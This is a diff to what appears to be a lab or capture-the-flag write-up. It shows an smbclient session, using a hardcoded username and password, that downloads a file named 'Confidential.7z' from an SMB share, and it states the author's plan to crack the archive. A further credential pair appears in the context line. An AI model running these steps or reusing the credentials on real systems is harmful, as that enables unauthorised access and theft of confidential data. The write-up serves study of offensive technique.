@@ -307,3 +307,18 @@ staging_admin:Spring_2026_Temp!
 
 Ill also get the 7z file to my machine by first restoring it then moving it to the SMB share
 
+```python
+smbclient //EC2AMAZ-GQCP864/UpdateServicesPackages -U 'xiao.ge'%'AmBZATVjnH4qo8H4'                   
+Try "help" to get a list of possible commands.
+smb: \> ls
+  .                                   D        0  Fri Apr 24 16:54:25 2026
+  ..                                  D        0  Tue Mar 10 18:06:38 2026
+  Confidential.7z                     A     3754  Fri Apr 17 22:36:33 2026
+
+		7863807 blocks of size 4096. 3238798 blocks available
+smb: \> get Confidential.7z 
+getting file \Confidential.7z of size 3754 as Confidential.7z (9.6 KiloBytes/sec) (average 9.6 KiloBytes/sec)
+smb: \> 
+```
+Now i have it on my machine i can work on cracking it!
+
